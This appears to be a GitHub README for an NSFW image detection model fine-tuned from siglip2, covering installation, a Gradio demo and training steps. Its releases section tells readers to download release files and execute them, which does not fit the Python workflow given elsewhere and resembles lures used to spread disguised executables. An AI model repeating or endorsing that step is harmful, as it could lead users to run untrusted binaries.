# NSFW Image Detection 🖼️🚫

![GitHub Repo](https://img.shields.io/badge/GitHub-Repo-blue.svg) ![Releases](https://img.shields.io/badge/Releases-latest-orange.svg)

Welcome to the **NSFW Image Detection** repository! This project focuses on detecting and categorizing explicit, suggestive, or safe media in images. It utilizes a vision-language encoder model fine-tuned from the `siglip2-base-patch16-256` architecture. 

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Model Training](#model-training)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)
- [Releases](#releases)

## Overview

The **NSFW Image Detection** model is designed to help developers and researchers filter and categorize image content effectively. It is built on the `SiglipForImageClassification` architecture and aims to provide a reliable solution for identifying inappropriate content. 

This project can be particularly useful for applications that require content moderation, parental controls, or user-generated content platforms. 

## Features

- **Multi-class Classification**: The model can identify various content types, including explicit, suggestive, and safe media.
- **Easy Integration**: Built with popular libraries like Hugging Face Transformers, making it easy to integrate into existing projects.
- **User-friendly Interface**: Utilize Gradio for a simple web interface to interact with the model.
- **High Accuracy**: Fine-tuned on a comprehensive dataset to ensure reliable detection results.

## Installation

To get started, you need to install the necessary dependencies. You can do this using pip. 

```bash
pip install -r requirements.txt
```

Make sure you have Python 3.6 or higher installed on your machine.

## Usage

To use the NSFW Image Detection model, follow these steps:

1. **Clone the repository**:
   ```bash
   git clone https://github.com/pedropqv/nsfw-image-detection.git
   cd nsfw-image-detection
   ```

2. **Run the Gradio app**:
   ```bash
   python app.py
   ```

3. **Access the web interface**: Open your browser and go to `http://localhost:7860` to start using the model.

You can upload images and see the classification results in real-time.

## Model Training

If you're interested in training the model further, follow these steps:

1. **Prepare your dataset**: Make sure your images are organized into folders based on their categories (e.g., explicit, suggestive, safe).
  
2. **Update the configuration file**: Modify the `config.yaml` file to point to your dataset.

3. **Start training**:
   ```bash
   python train.py
   ```

4. **Monitor the training process**: You can check the logs for any issues and track the training progress.

5. **Save the model**: Once training is complete, make sure to save your model for future use.

## Contributing

We welcome contributions! If you'd like to contribute to this project, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your changes to your fork.
5. Open a pull request.

Please ensure your code follows the existing style and includes tests where applicable.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For questions or suggestions, feel free to open an issue or contact me directly.

## Releases

You can find the latest releases of this project [here](https://github.com/pedropqv/nsfw-image-detection/releases). Download the necessary files and execute them to get started with the model.

For more details on how to use the released versions, please refer to the documentation provided in the releases section.

## Conclusion

The **NSFW Image Detection** project offers a robust solution for identifying and categorizing explicit content in images. By utilizing state-of-the-art models and easy-to-use interfaces, this tool can help enhance content moderation across various platforms.

Explore the repository, contribute, and help improve this valuable resource for the community. 

Thank you for your interest!